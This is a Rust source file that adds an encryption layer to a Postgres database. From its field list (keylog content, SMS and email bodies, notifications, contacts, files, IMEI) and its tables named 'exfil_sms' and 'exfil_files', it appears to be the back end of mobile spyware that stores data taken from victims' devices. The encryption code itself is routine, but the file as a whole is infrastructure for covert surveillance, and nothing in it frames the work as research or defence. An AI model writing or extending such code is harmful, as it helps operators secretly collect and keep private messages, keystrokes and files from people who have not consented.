use aes_gcm::{Aes256Gcm, Key, Nonce};
use aes_gcm::aead::{Aead, KeyInit};
use anyhow::Result;
use rand::RngCore;
use std::sync::Arc;
use tracing::debug;

// ============================================================================
// ENCRYPTION KEY MANAGER
// ============================================================================

pub struct EncryptionKeyManager {
    master_key: Vec<u8>,
    key_version: u32,
}

impl EncryptionKeyManager {
    pub fn new(master_key: Vec<u8>) -> Self {
        assert_eq!(master_key.len(), 32, "Master key must be 32 bytes");
        Self { master_key, key_version: 1 }
    }

    pub fn generate_key() -> Vec<u8> {
        let mut key = vec![0u8; 32];
        rand::thread_rng().fill_bytes(&mut key);
        key
    }

    pub fn encrypt(&self, plaintext: &[u8]) -> Result<Vec<u8>> {
        let mut nonce_bytes = vec![0u8; 12];
        rand::thread_rng().fill_bytes(&mut nonce_bytes);

        let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&self.master_key));
        let nonce = Nonce::from_slice(&nonce_bytes);

        match cipher.encrypt(nonce, plaintext) {
            Ok(ciphertext) => {
                let mut result = vec![self.key_version as u8];
                result.extend_from_slice(&nonce_bytes);
                result.extend_from_slice(&ciphertext);
                debug!("Encrypted {} bytes", plaintext.len());
                Ok(result)
            }
            Err(e) => Err(anyhow::anyhow!("Encryption failed: {}", e)),
        }
    }

    pub fn decrypt(&self, ciphertext_with_meta: &[u8]) -> Result<Vec<u8>> {
        if ciphertext_with_meta.len() < 13 {
            return Err(anyhow::anyhow!("Ciphertext too short"));
        }

        let _key_version = ciphertext_with_meta[0];
        let nonce_bytes = &ciphertext_with_meta[1..13];
        let nonce = Nonce::from_slice(nonce_bytes);
        let ciphertext = &ciphertext_with_meta[13..];

        let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&self.master_key));

        match cipher.decrypt(nonce, ciphertext) {
            Ok(plaintext) => {
                debug!("Decrypted {} bytes", plaintext.len());
                Ok(plaintext)
            }
            Err(e) => Err(anyhow::anyhow!("Decryption failed: {}", e)),
        }
    }

    pub fn rotate_key(&mut self, new_master_key: Vec<u8>) {
        assert_eq!(new_master_key.len(), 32, "Master key must be 32 bytes");
        self.master_key = new_master_key;
        self.key_version += 1;
        debug!("Key rotated, new version: {}", self.key_version);
    }
}

// ============================================================================
// TRANSPARENT ENCRYPTION FOR SPECIFIC FIELDS
// ============================================================================

pub struct SensitiveFields;

impl SensitiveFields {
    pub const ENCRYPTED_FIELDS: &'static [&'static str] = &[
        "imei",
        "phone_number",
        "sms_body",
        "notification_title",
        "notification_body",
        "keylog_content",
        "file_data",
        "contact_name",
        "contact_number",
        "email_subject",
        "email_body",
    ];

    pub fn should_encrypt(field_name: &str) -> bool {
        Self::ENCRYPTED_FIELDS.contains(&field_name)
    }
}

// ============================================================================
// DATABASE WRAPPER WITH TRANSPARENT ENCRYPTION
// ============================================================================

pub struct EncryptedDatabase {
    db: sqlx::PgPool,
    encryption: Arc<EncryptionKeyManager>,
}

impl EncryptedDatabase {
    pub fn new(db: sqlx::PgPool, encryption: Arc<EncryptionKeyManager>) -> Self {
        Self { db, encryption }
    }

    pub async fn insert_device_encrypted(
        &self,
        device_id: &str,
        imei: Option<&str>,
        phone_number: Option<&str>,
    ) -> Result<()> {
        let encrypted_imei = imei
            .map(|v| self.encryption.encrypt(v.as_bytes()))
            .transpose()?;

        let encrypted_phone = phone_number
            .map(|v| self.encryption.encrypt(v.as_bytes()))
            .transpose()?;

        sqlx::query(
            "INSERT INTO devices (device_id, imei, phone_number) VALUES ($1, $2, $3)"
        )
        .bind(device_id)
        .bind(encrypted_imei)
        .bind(encrypted_phone)
        .execute(&self.db)
        .await?;

        Ok(())
    }

    pub async fn get_device_decrypted(&self, device_id: &str) -> Result<Option<DeviceDecrypted>> {
        let record = sqlx::query_as::<_, (String, Option<Vec<u8>>, Option<Vec<u8>>)>(
            "SELECT device_id, imei, phone_number FROM devices WHERE device_id = $1"
        )
        .bind(device_id)
        .fetch_optional(&self.db)
        .await?;

        match record {
            Some((id, enc_imei, enc_phone)) => {
                let imei = enc_imei
                    .as_ref()
                    .map(|v| {
                        self.encryption
                            .decrypt(v)
                            .and_then(|bytes| Ok(String::from_utf8(bytes)?))
                    })
                    .transpose()?;

                let phone_number = enc_phone
                    .as_ref()
                    .map(|v| {
                        self.encryption
                            .decrypt(v)
                            .and_then(|bytes| Ok(String::from_utf8(bytes)?))
                    })
                    .transpose()?;

                Ok(Some(DeviceDecrypted { device_id: id, imei, phone_number }))
            }
            None => Ok(None),
        }
    }

    pub async fn insert_sms_encrypted(
        &self,
        sms_id: &str,
        device_id: &str,
        body: &str,
    ) -> Result<()> {
        let encrypted_body = self.encryption.encrypt(body.as_bytes())?;

        sqlx::query(
            "INSERT INTO exfil_sms (sms_id, device_id, body) VALUES ($1, $2, $3)"
        )
        .bind(sms_id)
        .bind(device_id)
        .bind(encrypted_body)
        .execute(&self.db)
        .await?;

        Ok(())
    }

    pub async fn get_sms_decrypted(&self, device_id: &str, limit: i32) -> Result<Vec<SmsDecrypted>> {
        let records = sqlx::query_as::<_, (String, Option<Vec<u8>>, Option<String>)>(
            "SELECT sms_id, body, received_at FROM exfil_sms WHERE device_id = $1 LIMIT $2"
        )
        .bind(device_id)
        .bind(limit)
        .fetch_all(&self.db)
        .await?;

        let mut results = Vec::new();
        for (sms_id, enc_body, received_at) in records {
            let body = enc_body
                .as_ref()
                .map(|v| {
                    self.encryption
                        .decrypt(v)
                        .and_then(|bytes| Ok(String::from_utf8(bytes)?))
                })
                .transpose()?;

            results.push(SmsDecrypted { sms_id, body, received_at });
        }

        Ok(results)
    }

    pub async fn insert_file_encrypted(
        &self,
        file_id: &str,
        device_id: &str,
        file_name: &str,
        file_data: &[u8],
    ) -> Result<()> {
        let encrypted_data = self.encryption.encrypt(file_data)?;

        sqlx::query(
            "INSERT INTO exfil_files (file_id, device_id, file_name, file_data) VALUES ($1, $2, $3, $4)"
        )
        .bind(file_id)
        .bind(device_id)
        .bind(file_name)
        .bind(encrypted_data)
        .execute(&self.db)
        .await?;

        Ok(())
    }

    pub async fn get_file_decrypted(&self, file_id: &str) -> Result<Option<Vec<u8>>> {
        let record = sqlx::query_as::<_, (Vec<u8>,)>(
            "SELECT file_data FROM exfil_files WHERE file_id = $1"
        )
        .bind(file_id)
        .fetch_optional(&self.db)
        .await?;

        match record {
            Some((encrypted_data,)) => {
                let decrypted = self.encryption.decrypt(&encrypted_data)?;
                Ok(Some(decrypted))
            }
            None => Ok(None),
        }
    }
}

// ============================================================================
// HELPER TYPES
// ============================================================================

#[derive(Debug, Clone)]
pub struct DeviceDecrypted {
    pub device_id: String,
    pub imei: Option<String>,
    pub phone_number: Option<String>,
}

#[derive(Debug, Clone)]
pub struct SmsDecrypted {
    pub sms_id: String,
    pub body: Option<String>,
    pub received_at: Option<String>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_encrypt_decrypt() {
        let key = EncryptionKeyManager::generate_key();
        let manager = EncryptionKeyManager::new(key);

        let plaintext = b"secret data";
        let ciphertext = manager.encrypt(plaintext).unwrap();
        let decrypted = manager.decrypt(&ciphertext).unwrap();

        assert_eq!(plaintext, decrypted.as_slice());
    }

    #[test]
    fn test_should_encrypt() {
        assert!(SensitiveFields::should_encrypt("imei"));
        assert!(SensitiveFields::should_encrypt("phone_number"));
        assert!(!SensitiveFields::should_encrypt("device_id"));
    }
}
